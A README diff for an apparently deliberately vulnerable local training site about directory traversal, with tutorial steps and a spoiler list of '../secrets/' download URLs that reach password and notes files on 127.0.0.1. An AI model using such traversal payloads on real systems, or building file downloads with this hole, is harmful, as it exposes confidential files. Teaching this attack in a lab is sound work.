@@ -1,24 +1,41 @@
-# README
+# PURPOSE: The purpose of this website is to demonstrate how attackers may perform directory traversal attacks. Look for clues like the names of the publicly displayed files on the website as well as the information within the files in order to find the name of the directory and name of the files you want to traverse to.
 
-This README would normally document whatever steps are necessary to get the
-application up and running.
+# TUTORIAL
 
-Things you may want to cover:
+# 1. Download the files and pay attention to the hints on the name of the directory, as well as the files within the directory you are attempting to traverse to.
 
-* Ruby version
+# 2. Hover over the files in order to see what url is used in order to download a file (Example: http://127.0.0.1:3000/files/download?file=asdf.txt).
 
-* System dependencies
+# 3. Once you are aware of the directory name, and its files, edit the previously posted url in order to access the files you're looking for.
 
-* Configuration
+# 4. Once the file from the private directory is downloaded, look at the confidential contained within the file.
 
-* Database creation
+# SPOILERS BELOW!!!
 
-* Database initialization
 
-* How to run the test suite
 
-* Services (job queues, cache servers, search engines, etc.)
 
-* Deployment instructions
 
-* ...
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# All of the download urls for the /secrets/ directory
+
+# http://127.0.0.1:3000/files/download?file=../secrets/list.txt
+# http://127.0.0.1:3000/files/download?file=../secrets/passwords.txt
+# http://127.0.0.1:3000/files/download?file=../secrets/info.txt
+# http://127.0.0.1:3000/files/download?file=../secrets/notes.txt
+# http://127.0.0.1:3000/files/download?file=../secrets/notes(1).txt
